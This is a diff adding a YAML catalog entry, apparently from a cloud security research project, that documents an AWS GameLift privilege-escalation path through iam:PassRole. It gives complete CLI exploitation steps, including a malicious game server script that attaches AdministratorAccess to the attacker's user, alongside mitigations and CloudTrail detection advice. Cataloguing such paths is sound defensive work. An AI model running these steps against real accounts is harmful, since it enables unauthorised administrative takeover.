@@ -1,0 +1,319 @@
+id: gamelift-001
+name: iam:PassRole + gamelift:CreateBuild + gamelift:CreateFleet
+category: new-passrole
+services:
+  - iam
+  - gamelift
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM instance role to the GameLift service
+    - permission: gamelift:CreateBuild
+      resourceConstraints: No resource constraints required
+    - permission: gamelift:CreateFleet
+      resourceConstraints: No resource constraints required
+    - permission: gamelift:RequestUploadCredentials
+      resourceConstraints: Required to get temporary S3 credentials for uploading the build binary to GameLift's managed S3 location
+  additional:
+    - permission: gamelift:DescribeBuild
+      resourceConstraints: Useful for polling build status until it reaches READY
+    - permission: gamelift:DescribeFleetAttributes
+      resourceConstraints: Useful for monitoring fleet provisioning status
+    - permission: gamelift:ListFleets
+      resourceConstraints: Helpful for discovering existing fleets
+    - permission: gamelift:DescribeInstances
+      resourceConstraints: Useful for confirming instance provisioning
+    - permission: gamelift:GetComputeAccess
+      resourceConstraints: Useful for accessing fleet instances to verify execution
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `gamelift:CreateBuild`, `gamelift:CreateFleet`, and `gamelift:RequestUploadCredentials` can escalate privileges by uploading a malicious game server binary as a GameLift build, then creating a fleet with an admin IAM instance role. The game server process runs on the fleet's EC2 instances with the `SHARED_CREDENTIAL_FILE` instance role credentials provider, giving it access to the admin role credentials. The server script calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.
+
+prerequisites:
+  admin:
+    - A role must exist that can be used as an EC2 instance role (trusts ec2.amazonaws.com)
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - A role must exist that can be used as an EC2 instance role and has elevated permissions
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        mkdir -p /tmp/gameserver-build
+        cat > /tmp/gameserver-build/gameserver.sh << 'EOF'
+        #!/bin/bash
+        # Wait for SHARED_CREDENTIAL_FILE credentials to be available
+        sleep 10
+        # Use the instance role credentials to escalate privileges
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        echo "Privilege escalation complete"
+        # Keep running so the fleet doesn't immediately terminate
+        while true; do sleep 60; done
+        EOF
+        chmod +x /tmp/gameserver-build/gameserver.sh
+      description: Create a malicious game server script that uses the fleet instance role's credentials (provided via SHARED_CREDENTIAL_FILE) to call iam:AttachUserPolicy and escalate privileges.
+    - step: 2
+      command: |
+        BUILD_OUTPUT=$(aws gamelift create-build \
+          --name privesc-build \
+          --operating-system AMAZON_LINUX_2023 \
+          --server-sdk-version 5.2.0 \
+          --build-version 1.0.0)
+
+        BUILD_ID=$(echo $BUILD_OUTPUT | jq -r '.Build.BuildId')
+
+        UPLOAD_CREDS=$(aws gamelift request-upload-credentials \
+          --build-id $BUILD_ID)
+
+        # Upload the build to GameLift's S3 location using the temporary upload credentials
+        S3_BUCKET=$(echo $UPLOAD_CREDS | jq -r '.StorageLocation.Bucket')
+        S3_KEY=$(echo $UPLOAD_CREDS | jq -r '.StorageLocation.Key')
+        ACCESS_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.AccessKeyId')
+        SECRET_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SecretAccessKey')
+        SESSION_TOKEN=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SessionToken')
+
+        AWS_ACCESS_KEY_ID=$ACCESS_KEY \
+        AWS_SECRET_ACCESS_KEY=$SECRET_KEY \
+        AWS_SESSION_TOKEN=$SESSION_TOKEN \
+        aws s3 cp /tmp/gameserver-build/ s3://$S3_BUCKET/$S3_KEY \
+          --recursive
+      description: Create a GameLift build record, get temporary upload credentials via gamelift:RequestUploadCredentials, and upload the malicious game server binary to GameLift's managed S3 bucket.
+    - step: 3
+      command: |
+        aws gamelift describe-build \
+          --build-id BUILD_ID \
+          --query 'Build.Status' \
+          --output text
+      description: Poll build status until it reaches READY, indicating the binary has been validated and is ready for fleet deployment.
+    - step: 4
+      command: |
+        aws gamelift create-fleet \
+          --name privesc-fleet \
+          --build-id BUILD_ID \
+          --compute-type EC2 \
+          --ec2-instance-type c5.large \
+          --fleet-type ON_DEMAND \
+          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
+          --runtime-configuration '{
+            "ServerProcesses": [{
+              "LaunchPath": "/local/game/gameserver.sh",
+              "ConcurrentExecutions": 1
+            }]
+          }'
+      description: Create a GameLift fleet with the admin IAM instance role, using SHARED_CREDENTIAL_FILE to make the role credentials available to the game server process. The server starts automatically and escalates privileges.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative GameLift fleet instance roles** - Game server fleets rarely need administrative IAM access. Scope instance roles to only the DynamoDB tables, S3 buckets, and services required for the game server.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificGameLiftRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "gamelift.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Restrict `gamelift:RequestUploadCredentials`** - This permission is required to upload builds but also enables the full attack chain. Restrict it alongside CreateBuild and CreateFleet.
+  - Monitor CloudTrail for unusual GameLift fleet creation followed by IAM policy attachment events
+  - Monitor CloudTrail for fleet creation by principals who do not usually manage GameLift fleets
+  - Monitor CloudTrail for roles being passed to GameLift that haven't been used before
+  - Alert on IAM policy attachment events originating from GameLift fleet instances
+  - Regularly audit GameLift fleet instance roles for excessive IAM permissions
+
+limitations: |
+  This path provides administrative access only if the passed instance role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). GameLift fleet provisioning typically takes 5-15 minutes, making this a slower escalation path.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon GameLift - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazongamelift.html"
+  - title: "Set up an IAM service role for Amazon GameLift Servers"
+    url: "https://docs.aws.amazon.com/gamelift/latest/developerguide/setting-up-role.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/gamelift-001-iam-passrole+gamelift-createbuild+gamelift-createfleet"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole`, `gamelift:CreateBuild`, `gamelift:CreateFleet`, and `gamelift:RequestUploadCredentials` permissions. Can be an IAM user or role.
+
+    - id: build
+      label: GameLift Build
+      type: resource
+      description: |
+        A new GameLift build record created by the attacker. The build record is a container for a game server binary that GameLift deploys to fleet instances. The attacker uploads a malicious game server script that calls `iam:AttachUserPolicy` using the fleet instance role's credentials.
+
+        Command:
+        ```bash
+        aws gamelift create-build \
+          --name privesc-build \
+          --operating-system AMAZON_LINUX_2023 \
+          --server-sdk-version 5.2.0 \
+          --build-version 1.0.0
+        ```
+
+        After creating the build, `gamelift:RequestUploadCredentials` provides temporary S3 credentials to upload the malicious binary to GameLift's managed S3 bucket.
+
+    - id: fleet
+      label: GameLift Fleet
+      type: resource
+      description: |
+        A new GameLift fleet created by the attacker with the admin IAM instance role attached. GameLift provisions EC2 instances for the fleet and deploys the malicious game server binary. The `SHARED_CREDENTIAL_FILE` credentials provider makes the instance role's credentials available to game server processes.
+
+        Command:
+        ```bash
+        aws gamelift create-fleet \
+          --name privesc-fleet \
+          --build-id BUILD_ID \
+          --compute-type EC2 \
+          --ec2-instance-type c5.large \
+          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
+          --runtime-configuration '{"ServerProcesses":[{"LaunchPath":"/local/game/gameserver.sh","ConcurrentExecutions":1}]}'
+        ```
+
+    - id: game_server
+      label: Game Server Process
+      type: payload
+      color: '#99ccff'
+      description: |
+        The malicious game server script that executes on the GameLift fleet instance. The script uses the instance role credentials made available via `SHARED_CREDENTIAL_FILE` to call `iam:AttachUserPolicy` and escalate the starting principal's privileges.
+
+        Malicious game server script:
+        ```bash
+        #!/bin/bash
+        # Wait for SHARED_CREDENTIAL_FILE credentials to be available
+        sleep 10
+        # Use the instance role credentials to escalate privileges
+        aws iam attach-user-policy \
+          --user-name STARTING_USER \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        echo "Privilege escalation complete"
+        # Keep running so the fleet does not immediately terminate
+        while true; do sleep 60; done
+        ```
+
+        The game server process is launched automatically when the fleet's EC2 instances become active. Fleet provisioning typically takes 5-15 minutes.
+
+    - id: instance_role
+      label: Admin Instance Role
+      type: principal
+      description: The IAM role attached to the GameLift fleet instances. The role must trust `ec2.amazonaws.com` and is made available to game server processes via `SHARED_CREDENTIAL_FILE` (the `--instance-role-credentials-provider` parameter). The game server script uses this role's credentials to make privileged IAM API calls.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: The fleet instance role has AdministratorAccess or equivalent permissions. The malicious game server script successfully calls `iam:AttachUserPolicy` using those credentials, granting the starting principal full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The fleet instance role has some elevated permissions but not full admin access. The game server script can leverage those permissions for data access, security configuration changes, or additional privilege escalation paths, but cannot directly attach AdministratorAccess to the starting principal.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The fleet instance role only has minimal permissions scoped to GameLift operations. The game server script executes but provides limited privilege escalation value.
+
+  edges:
+    - from: start
+      to: build
+      label: gamelift:CreateBuild + gamelift:RequestUploadCredentials
+      description: |
+        Create a GameLift build record and upload the malicious game server binary. `gamelift:RequestUploadCredentials` provides temporary S3 credentials to upload the binary to GameLift's managed S3 bucket.
+
+        Step 1 — Create build record:
+        ```bash
+        aws gamelift create-build \
+          --name privesc-build \
+          --operating-system AMAZON_LINUX_2023 \
+          --server-sdk-version 5.2.0 \
+          --build-version 1.0.0
+        ```
+
+        Step 2 — Get upload credentials and upload binary:
+        ```bash
+        UPLOAD_CREDS=$(aws gamelift request-upload-credentials --build-id $BUILD_ID)
+        AWS_ACCESS_KEY_ID=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.AccessKeyId') \
+        AWS_SECRET_ACCESS_KEY=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SecretAccessKey') \
+        AWS_SESSION_TOKEN=$(echo $UPLOAD_CREDS | jq -r '.UploadCredentials.SessionToken') \
+        aws s3 cp /tmp/gameserver-build/ s3://$S3_BUCKET/$S3_KEY --recursive
+        ```
+
+    - from: start
+      to: fleet
+      label: iam:PassRole + gamelift:CreateFleet
+      description: |
+        Create a GameLift fleet with the admin IAM instance role attached, using the `SHARED_CREDENTIAL_FILE` credentials provider so game server processes can access the role credentials. This is the `iam:PassRole` step.
+
+        Command:
+        ```bash
+        aws gamelift create-fleet \
+          --name privesc-fleet \
+          --build-id BUILD_ID \
+          --compute-type EC2 \
+          --ec2-instance-type c5.large \
+          --fleet-type ON_DEMAND \
+          --instance-role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
+          --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
+          --runtime-configuration '{"ServerProcesses":[{"LaunchPath":"/local/game/gameserver.sh","ConcurrentExecutions":1}]}'
+        ```
+
+    - from: fleet
+      to: game_server
+      label: Fleet provisions EC2, game server starts
+      description: GameLift provisions EC2 instances for the fleet and deploys the malicious game server binary. When the instances become active (typically 5-15 minutes), GameLift automatically launches the game server process defined in the runtime configuration.
+
+    - from: game_server
+      to: instance_role
+      label: Server accesses role via SHARED_CREDENTIAL_FILE
+      description: The game server process accesses the fleet instance role's temporary credentials via the `SHARED_CREDENTIAL_FILE` credentials provider. GameLift writes the instance role credentials to a shared credential file on the instance, making them available to processes running on the fleet without requiring direct IMDS queries.
+
+    - from: instance_role
+      to: admin
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: If the fleet instance role has AdministratorAccess or IAM write permissions, the game server script successfully calls `iam:AttachUserPolicy`, granting the starting principal full administrative access.
+
+    - from: instance_role
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the instance role has elevated permissions but not IAM write access, the game server script can leverage those permissions for data access or reconnaissance but cannot directly elevate the starting principal.
+
+    - from: instance_role
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the instance role only has minimal permissions scoped to GameLift operations, the game server script executes but provides limited privilege escalation value.
